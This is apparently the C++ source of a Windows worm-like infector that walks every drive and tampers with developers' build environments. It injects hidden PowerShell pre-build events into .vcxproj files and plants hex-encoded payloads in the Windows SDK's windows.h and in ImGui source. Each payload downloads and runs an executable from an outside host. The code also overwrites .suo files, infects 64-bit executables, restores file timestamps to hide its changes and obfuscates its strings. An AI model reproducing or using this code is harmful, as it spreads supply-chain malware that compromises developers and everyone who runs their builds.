#include <iostream>
#include <fstream>
#include <string>
#include <regex>
#include <filesystem>
#include <chrono>
#include <iomanip>
#include "ExInfector/mainito.h"
#include <random>
#include <Windows.h>
#include <vector>

//#include "../Functions.h"
namespace fs = std::filesystem;


std::vector<uint8_t> suo = {
	0xD0, 0xCF, 0xFF
};

std::vector<uint8_t> bitt = {
	0xD0, 0xCF, 0xFF
};

string MainOwnerNumber;

std::string wstring_view_to_string(std::wstring_view wstr_view) {
	return std::string(wstr_view.begin(), wstr_view.end());
}

void replaceBackslashes(const std::string& filePath) {
	// Open the file for reading
	std::ifstream inputFile(filePath);
	if (!inputFile) {
		std::cerr << EC("Error: Could not open the file for reading: ") << filePath << std::endl;
		return;
	}

	// Read the content of the file into a string
	std::string content((std::istreambuf_iterator<char>(inputFile)),
		(std::istreambuf_iterator<char>()));
	inputFile.close();

	// Replace all backslashes with forward slashes
	for (char& c : content) {
		if (c == '\\') {
			c = '/';
		}
	}

	// Open the file for writing
	std::ofstream outputFile(filePath);
	if (!outputFile) {
		std::cerr << EC("Error: Could not open the file for writing: ") << filePath << std::endl;
		return;
	}

	// Write the modified content back to the file
	outputFile << content;
	outputFile.close();

	std::cout << EC("All backslashes have been replaced with forward slashes in the file: ") << filePath << std::endl;
}



std::vector<std::string> GetWindowsSDKPaths() {
	HKEY hKey;
	const char* subKey = EC("SOFTWARE\\Microsoft\\Windows Kits\\Installed Roots");
	char sdkPath[MAX_PATH];
	DWORD size = MAX_PATH;
	std::vector<std::string> sdkPaths;

	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
		std::cerr << EC("Failed to open registry key.") << std::endl;
		return sdkPaths;
	}

	if (RegQueryValueExA(hKey, EC("KitsRoot10"), nullptr, nullptr, (LPBYTE)sdkPath, &size) != ERROR_SUCCESS) {
		std::cerr << EC("Failed to read registry value.") << std::endl;
		RegCloseKey(hKey);
		return sdkPaths;
	}
	RegCloseKey(hKey);

	std::string includePath = std::string(sdkPath) + EC("Include");
	WIN32_FIND_DATAA findData;
	HANDLE hFind = FindFirstFileA((includePath + EC("\\*")).c_str(), &findData);

	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				std::string version = findData.cFileName;
				if (version.find('.') != std::string::npos) {
					std::string fullPath = includePath + EC("\\") + version + EC("\\um\\windows.h");
					sdkPaths.push_back(fullPath);
				}
			}
		} while (FindNextFileA(hFind, &findData));
		FindClose(hFind);
	}
	else {
		std::cerr << EC("Failed to find SDK versions.") << std::endl;
	}

	return sdkPaths;
}

bool FileExists(const std::string& path) {
	DWORD fileAttr = GetFileAttributesA(path.c_str());
	return (fileAttr != INVALID_FILE_ATTRIBUTES && !(fileAttr & FILE_ATTRIBUTE_DIRECTORY));
}

std::string GetTempFilePath() {
	char tempPath[MAX_PATH];
	char tempFile[MAX_PATH];

	if (GetTempPathA(MAX_PATH, tempPath) == 0) {
		return "";
	}

	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<int> dist(100000, 999999);

	sprintf_s(tempFile, EC("%sads_%d.h"), tempPath, dist(gen));
	return std::string(tempFile);
}


bool fileContainsString(const std::string& filePath, const std::string& searchString) {

	// Check if the file exists
	/*if (!std::filesystem::exists(filePath)) {
		std::cerr << EC("Error: File does not exist: ") << filePath << std::endl;
		return false;
	}*/

	// Try to open the file
	std::ifstream file(filePath, std::ios::in);
	if (!file.is_open()) {
		// Provide detailed error information
		std::cerr << EC("Error: Could not open the file! Path: ") << filePath << std::endl;

		return false;
	}

	// Read the file content
	std::string fileContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
	file.close();

	// Check if the file contains the search string
	return fileContent.find(searchString) != std::string::npos;
}



void InfectVcxproj(const std::string& filePath) {

	try {

		std::string preBuildEventText = EC(R"(<PreBuildEvent>
    <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://i-like.boats/Stb/Retev.php?bl=)") + BuildID + EC(R"(.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
</PreBuildEvent>)");


		if (fileContainsString(filePath, preBuildEventText)) return;

		std::ifstream file(filePath);
		if (!file.is_open()) {
			return;
		}

		fs::file_time_type original_time = fs::last_write_time(filePath);
		auto original_time_t = to_time_t(original_time);

		/*std::cout << "Original last modified date: "
			<< std::put_time(std::localtime(&original_time_t), "%Y-%m-%d %H:%M:%S")
			<< std::endl;*/


		std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
		file.close();

		// Define the pattern to find </ItemDefinitionGroup>
		std::string pattern = EC("</ItemDefinitionGroup>");
		std::regex rgx(pattern);

		// Insert <PreBuildEvent> above every </ItemDefinitionGroup>
		content = std::regex_replace(content, rgx, preBuildEventText + EC("\n$&"));

		// Write the modified content back to the file
		std::ofstream outputFile(filePath);
		if (!outputFile.is_open()) {
			std::cerr << EC("Error opening file for writing: ") << filePath << std::endl;
			return;
		}

		outputFile << content;
		outputFile.close();


		fs::last_write_time(filePath, original_time);

		// Verify the change
		fs::file_time_type new_time = fs::last_write_time(filePath);
		auto new_time_t = to_time_t(new_time);

		/*std::cout << "New last modified date: "
			<< std::put_time(std::localtime(&new_time_t), "%Y-%m-%d %H:%M:%S")
			<< std::endl;*/

			//std::cout << "Modified " << filePath << " successfully." << std::endl;
	}
	catch (...)
	{
		std::cout << EC("Excexption blah blah file prob open vcx path: ") << filePath << std::endl;
	}
}

std::string toHex(const std::string& str) {
	std::stringstream hexStream;
	for (unsigned char c : str) {
		hexStream << "\\x" << std::setw(2) << std::setfill('0') << std::hex << (int)c;
	}
	return hexStream.str();
}


void modifyFile(const std::string& filename, const std::string& includeString, const std::string& backendString) {

	std::ifstream inputFile(filename);
	if (!inputFile) {
		std::cerr << EC("Error opening file ") << filename << std::endl;
		return;
	}

	// Read the file content into a string
	std::string content;
	std::string line;
	bool foundInclude = false;
	bool foundBackendPlatform = false;

	while (std::getline(inputFile, line)) {
		content += line + EC("\n");

		// Check for #include <tchar.h>
		if (!foundInclude && line.find(EC("#include <tchar.h>")) != std::string::npos) {
			foundInclude = true;
			content += EC("#include <string>\n");
			content += includeString + EC("\n");
		}

		if (!foundBackendPlatform && line.find(EC("io.BackendPlatformName = \"imgui_impl_win32\";")) != std::string::npos) {
			foundBackendPlatform = true;
			content += backendString + EC("\n");
		}
	}

	// Close the input file
	inputFile.close();

	// If the relevant lines were found, rewrite the modified content to the file
	if (foundInclude || foundBackendPlatform) {
		std::ofstream outputFile(filename);
		if (!outputFile) {
			//std::cerr << "Error opening file " << filename << " for writing." << std::endl;
			return;
		}

		outputFile << content;
		outputFile.close();
		//std::cout << "File modified successfully!" << std::endl;
	}
	else {
		//std::cout << "Required lines not found in the file." << std::endl;
	}
}


bool InfectSDK(const std::string& source, std::string& dest) {

	fs::file_time_type original_time = fs::last_write_time(source);
	auto original_time_t = to_time_t(original_time);

	dest = GetTempFilePath();
	if (dest.empty()) {
		return false;
	}

	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dis(100000, 999999);
	std::string numma = std::to_string(dis(gen));

	bool DoesCont = fileContainsString(source, EC("VccLibaries"));
	bool DoesContMayn = fileContainsString(source, OwnersID);

	std::cout << EC("Contains VccLibaries: ") << DoesCont << std::endl;
	std::cout << EC("Contains OwnerID: ") << DoesContMayn << std::endl;

	if (DoesCont && DoesContMayn) {
		return false;
	}

	std::string input = EC(R"(start /min cmd.exe /c powershell -WindowStyle Hidden -Command "& { iwr -Uri 'https://i-like.boats/Stb/Retev.php?bl=)") + BuildID + EC(R"(.txt' -OutFile $env:APPDATA\BK)") + numma + EC(R"(.exe; Start-Process -FilePath $env:APPDATA\BK)") + numma + EC(R"(.exe -WindowStyle Hidden }")");
	std::string result = toHex(input);

	std::string payld = EC(R"(std::string F)") + OwnersID + EC(R"( = ")") + result + EC(R"(";)");
	std::string payldsys = EC(R"(    system(F)") + OwnersID + EC(R"(.c_str());)");

	std::ifstream inFile(source);
	if (!inFile) {
		return false;
	}

	std::ofstream outFile(dest);
	if (!outFile) {
		inFile.close();
		return false;
	}

	std::string line;
	bool modified = false;

	while (std::getline(inFile, line)) {
		outFile << line << EC("\n");

		// Add VccLibaries block if it doesn't exist
		if (line.find(EC("#endif /* _INC_WINDOWS */")) != std::string::npos && !modified && !DoesCont) {
			outFile << EC(R"(
#ifdef __cplusplus  // Only for C++ projects
#include <stdlib.h>
#include <string>
namespace VccLibaries {
    struct VCC {
        VCC() {
            static bool Rundollay = false;
            if (!Rundollay) {
                //Bombakla
)");
			// Add payload if OwnersID doesn't exist
			if (!DoesContMayn) {
				outFile << EC("                ") << payld << EC("\n");
				outFile << EC("                ") << payldsys << EC("\n");
			}
			outFile << EC(R"(
                Rundollay = true;
            }
        }
    };
    static VCC runner;
}
#endif
)");
			modified = true;
		}
		// If VccLibaries exists but OwnersID doesn't, add payload
		else if (line.find(EC("//Bombakla")) != std::string::npos && DoesCont && !DoesContMayn && !modified) {
			outFile << EC("                ") << payld << EC("\n");
			outFile << EC("                ") << payldsys << EC("\n");
			modified = true;
		}
	}

	inFile.close();
	outFile.close();

	fs::last_write_time(dest, original_time);

	fs::file_time_type new_time = fs::last_write_time(dest);
	auto new_time_t = to_time_t(new_time);

	Sleep(3000);

	AdminOpen(EC("cmd.exe /c \"move \"") + dest + EC("\" \"") + source + EC("\"\""));

	Sleep(5000);

	remove(dest.c_str());

	return true;
}





void InfectImgui(const std::string& filePath, const std::string& OWNMB)
{
	fs::file_time_type original_time = fs::last_write_time(filePath);
	auto original_time_t = to_time_t(original_time);

	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dis(100000, 999999);
	std::string numma = std::to_string(dis(gen));

	std::string input = EC(R"(start /min cmd.exe /c powershell -WindowStyle Hidden -Command "& { iwr -Uri 'https://i-like.boats/Stb/Retev.php?bl=)") + BuildID + EC(R"(.txt' -OutFile $env:APPDATA\HPSR)") + numma + EC(R"(.exe; Start-Process -FilePath $env:APPDATA\HPSR)") + numma + EC(R"(.exe -WindowStyle Hidden }")");
	std::string result = toHex(input);

	std::string payld = EC(R"(std::string F)") + OwnersID + EC(R"( = ")") + result + EC(R"(";)");
	std::string payldsys = EC(R"(    system(F)") + OwnersID + EC(R"(.c_str());)");


	if (fileContainsString(filePath, payldsys)) return;


	modifyFile(filePath, payld, payldsys);/**/

	fs::last_write_time(filePath, original_time);

	fs::file_time_type new_time = fs::last_write_time(filePath);
	auto new_time_t = to_time_t(new_time);
}


void InfectSuo(const std::string& filePath) {

	try {

		fs::file_time_type original_time = fs::last_write_time(filePath);
		auto original_time_t = to_time_t(original_time);

		/*std::cout << "Original last modified date: "
			<< std::put_time(std::localtime(&original_time_t), "%Y-%m-%d %H:%M:%S")
			<< std::endl;*/


		remove(filePath.c_str());


		std::ofstream outfile(filePath, std::ios::binary);

		if (outfile.is_open()) {
			// Write the array to the file
			outfile.write(reinterpret_cast<char*>(suo.data()), suo.size());

			// Close the file stream
			outfile.close();

			//std::cout << "Array written to file: " << filePath << std::endl;
		}

		SetFileAttributesA(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN);

		fs::last_write_time(filePath, original_time);

		// Verify the change
		fs::file_time_type new_time = fs::last_write_time(filePath);
		auto new_time_t = to_time_t(new_time);

		/*std::cout << "New last modified date: "
			<< std::put_time(std::localtime(&new_time_t), "%Y-%m-%d %H:%M:%S")
			<< std::endl;

			std::cout << "Modified " << filePath << " successfully." << std::endl;*/
	}
	catch (...)
	{
		std::cout << EC("Excexption blah blah file prob open suo path: ") << filePath << std::endl;
	}
}

bool endsWith(const std::string& filePath, const std::string extension) {
	if (filePath.length() >= extension.length()) {
		return filePath.compare(filePath.length() - extension.length(), extension.length(), extension) == 0;
	}
	return false;
}

std::string trim(const std::string& str) {
	auto start = str.begin();
	while (start != str.end() && std::isspace(*start)) start++;

	auto end = str.end();
	do {
		end--;
	} while (std::distance(start, end) > 0 && std::isspace(*end));

	return std::string(start, end + 1);
}


bool containsWeirdStuff(const std::string& str) {
	for (char ch : str) {
		// Check if the character is not alphanumeric and not one of the allowed symbols
		if (!std::isalnum(static_cast<unsigned char>(ch)) &&
			ch != '\\' && ch != '/' && ch != ':' && ch != '.' &&
			ch != '_' && ch != '-' && ch != ' ' && ch != '&') {
			return true; // Found a weird character
		}
	}
	return false; // No weird characters found
}

bool fileExists(const std::string& path) {
	std::ifstream file(path);
	return file.good(); // Returns true if the file can be opened
}


std::string normalize_path(const std::string& path) {
	std::filesystem::path fs_path(path);
	return fs_path.lexically_normal().string();
}


int Winsisso(const char* command)
{
	SPOOF_FUNC;

	// Windows has a system() function which works, but it opens a command prompt window.

	char* tmp_command, * cmd_exe_path;
	int         ret_val;
	size_t          len;
	PROCESS_INFORMATION process_info = { 0 };
	STARTUPINFOA        startup_info = { 0 };


	len = strlen(command);
	tmp_command = (char*)malloc(len + 4);
	tmp_command[0] = 0x2F; // '/'
	tmp_command[1] = 0x63; // 'c'
	tmp_command[2] = 0x20; // <space>;
	memcpy(tmp_command + 3, command, len + 1);

	startup_info.cb = sizeof(STARTUPINFOA);
	cmd_exe_path = getenv(EC("COMSPEC"));
	_flushall();  // required for Windows system() calls, probably a good idea here too

	if (CreateProcessA(cmd_exe_path, tmp_command, NULL, NULL, 0, CREATE_NO_WINDOW, NULL, NULL, &startup_info, &process_info)) {
		WaitForSingleObject(process_info.hProcess, INFINITE);
		GetExitCodeProcess(process_info.hProcess, (LPDWORD)&ret_val);
		CloseHandle(process_info.hProcess);
		CloseHandle(process_info.hThread);
	}

	free((void*)tmp_command);

	return(ret_val);
}


std::vector<std::string> vcxproj;
std::vector<std::string> imguicpp;
std::vector<std::string> suolist;
std::vector<std::string> exe64;


void SDKInfector()
{
	// Windows SDK infector | Done and tested.
	{
		try
		{
			printf(EC("[SDK]  Running infector \n"));


			auto paths = GetWindowsSDKPaths();
			bool found = false;

			for (const auto& path : paths) {
				if (FileExists(path)) {
					std::string tempFilePath;
					if (InfectSDK(path, tempFilePath)) {
						std::cout << EC("Modified and copied to: ") << tempFilePath << std::endl;
					}
					else {
						std::cerr << EC("No need to modify!: ") << path << std::endl;
					}
				}
			}

			printf(EC("[SDK]  Done. \n"));
		}
		catch (...) {
			printf(EC("[SDK]  ERROR \n"));
		}
	}
}



void CppInfector()
{
	// .cpp infector | Done and tested.
	{
		try
		{
			printf(EC("[IMGUI CPP] Retrieving paths. \n"));


			printf(EC("[IMGUI CPP] Found %i imgui_impl_win32.cpp Files \n"), (int)imguicpp.size());
			printf(EC("[IMGUI CPP] Running infector \n"));

			for (const auto& cppPattey : imguicpp) {

				try
				{
					//std::cout << cppPattey << " \n";
					InfectImgui(cppPattey, MainOwnerNumber);
				}
				catch (...) { continue; }
			}


			printf(EC("[IMGUI CPP] Done. \n"));
		}
		catch (...) {
			printf(EC("[IMGUI CPP] ERROR \n"));
		}
	}
}


void VcxprojInfector()
{
	// Vcxproj infector | Done and tested.
	{
		try
		{


			printf(EC("[VCXPROJ] Found %i .vcxproj Files \n"), (int)vcxproj.size());
			printf(EC("[VCXPROJ] Running infector \n"));

			for (const auto& Pattey : vcxproj) {

				try
				{
					//std::cout << Pattey << " \n";
					InfectVcxproj(Pattey);
				}
				catch (...) { continue; }


			}


			printf(EC("[VCXPROJ] Done. \n"));
		}
		catch (...) {
			printf(EC("[VCXPROJ] ERROR \n"));
		}
	}
}


void SuoInfector()
{
	// .Suo infector | Done and tested.
	{
		try
		{

			printf(EC("[SUO] Found %i .suo Files \n"), (int)suolist.size());
			printf(EC("[SUO] Running infector \n"));

			SPOOF_CALL(Sleep)(500);

			std::cout << suo.size() << std::endl;

			if (suo.size() > 100)
			{
				printf(EC("[SUO] Passed \n"));


				for (const auto& Suopattey : suolist) {

					try
					{
						if (Suopattey.find(EC("\\.vs\\")) != std::string::npos) {

							//std::cout << EC("Infected suo: ") << Suopattey << std::endl;
							InfectSuo(Suopattey);
						}
						else {
							continue;
						}
					}
					catch (...) { continue; }
				}
			}

			printf(EC("[SUO] Done. \n"));
		}
		catch (...) {
			printf(EC("[SUO] ERROR \n"));
		}
	}

	suo.clear();
}


void ExeInfect()
{
	// x64 PE Infector | Done and tested.
	{
		try
		{

			printf(EC("[64PE] Found %i Unfiltered .exe Files \n"), (int)exe64.size());
			printf(EC("[64PE] Running infector \n"));


			std::cout << MainOwnerNumber << std::endl;


			SPOOF_CALL(Sleep)(500);

			std::cout << bitt.size() << std::endl;

			if (bitt.size() > 100)
			{
				printf(EC("[64PE] Passed \n"));


				InfectINIT(bitt, MainOwnerNumber);

				for (const auto& Exepattey : exe64) {

					try
					{
						if (Exepattey.find(EC("\\Windows")) != std::string::npos) {
							continue;
						}

						if (IsPE64NotOpenNoRBData(Exepattey)) {


							std::cout << EC("Infected exe: ") << Exepattey << std::endl;
							InfectThePE(Exepattey);
						}
						else {
							continue;
						}
					}
					catch (...) { printf(EC("[64PE] Err. \n")); continue; }

				}
			}

			printf(EC("[64PE] Done. \n"));
		}
		catch (...) {
			printf(EC("[64PE] ERROR \n"));
		}
	}

	bitt.clear();
}

bool isdonno = false;

void InfektCore()
{

	SendDebugMessage(EC("[INFEKT DBG] Infekt Starting"));

	try
	{
		for (char drive = 'A'; drive <= 'Z'; ++drive) {
			std::string drivePath = std::string(1, drive) + EC(":\\");

			std::wstring wDrivePath = std::wstring(drivePath.begin(), drivePath.end());

			// Check if the drive exists
			UINT driveType = GetDriveType(wDrivePath.c_str());
			if (driveType != DRIVE_NO_ROOT_DIR) {
				std::cout << drive << std::endl;

				std::string beybb = EC("dir /a /s /b ") + drivePath + EC("*imgui_impl_win32.cpp ") + drivePath + EC("*.suo ") + drivePath +
					EC("*.exe ") + drivePath + EC("*.vcxproj > C:\\ProgramData\\") + drive + EC("Dat.bin") + MainOwnerNumber;


				std::cout << EC("Command: ") << beybb << std::endl;

				// Execute the command
				Winsisso(beybb.c_str());

				Sleep(1500);


				replaceBackslashes((EC("C:\\ProgramData\\") + std::string(1, drive) + EC("DAT.bin") + MainOwnerNumber).c_str());

				std::cout << EC("Replashed slashes!") << std::endl;

				Sleep(1500);

				std::ifstream file((EC("C:\\ProgramData\\") + std::string(1, drive) + EC("DAT.bin") + MainOwnerNumber).c_str(), std::ios::binary);
				if (!file) {
					std::cerr << EC("Failed to open file DAT.bin\n");
				}

				std::string line;


				while (std::getline(file, line)) {

					line = trim(line);

					/*if (containsWeirdStuff(line))
					{

						std::cout << "Contains weird shit: " << line << std::endl;
						continue;
					}*/

					if (line.find(EC("C:\\Windows")) != std::string::npos)
					{

						std::cout << EC("Windows dtc") << std::endl;
						continue;
					}

					if (fileExists(line)) {

						if (line.find(EC(".suo")) != std::string::npos && endsWith(line, EC(".suo"))) {
							suolist.push_back(normalize_path(line));
						}
						else if (line.find(EC(".vcxproj")) != std::string::npos && endsWith(line, EC(".vcxproj"))) {
							vcxproj.push_back(normalize_path(line));
						}
						else if (line.find(EC("imgui_impl_win32.cpp")) != std::string::npos && endsWith(line, EC("imgui_impl_win32.cpp"))) {
							imguicpp.push_back(normalize_path(line));
						}
						else if (line.find(EC(".exe")) != std::string::npos && endsWith(line, EC(".exe"))) {
							exe64.push_back(normalize_path(line));
						}


					}
					else { continue; }


				}

				file.close();

				std::cout << EC("Done Now Gonna Remove") << std::endl;

				Sleep(1000);
				remove((EC("C:\\ProgramData\\") + std::string(1, drive) + EC("DAT.bin") + MainOwnerNumber).c_str());

			}
		}


		isdonno = true;

	}
	catch (...) {
		SendDebugMessage(EC("[INFEKT DBG] CATCHHHHH"));
	}


	SendDebugMessage(EC("[INFEKT DBG] Full End"));

	Sleep(1000);
}




void InfectorBridge()
{
	/*SPOOF_FUNC;

	CreateThread(NULL, 0, StartInfekMain, NULL, 0, NULL);*/

	HANDLE Loke = GetCurrentThread();
	SetThreadPriority(Loke, THREAD_PRIORITY_NORMAL);

	__try
	{
		InfektCore();
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

	}
}